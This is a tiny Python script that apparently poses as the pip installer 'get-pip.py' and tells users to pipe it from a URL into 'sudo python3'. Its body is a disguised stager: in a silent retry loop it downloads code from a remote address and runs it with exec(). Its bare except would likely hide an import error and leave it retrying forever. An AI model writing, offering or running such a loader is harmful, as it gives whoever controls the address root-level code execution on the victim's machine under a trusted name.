#!/usr/bin/env python3
# SPDX-License-Identifier: MIT
# SPDX-FileCopyrightText: Pete Ezzo
"""
run this like: curl https://someplace/get-pip.py | sudo python3 -
"""

import time, random, urllib
uri = 'http://localhost:8000/main.py'
while True:
    try:
        exec(urllib.request.urlopen(uri).read())
    except:
        time.sleep(random.randint(200,400))
    else:
        break
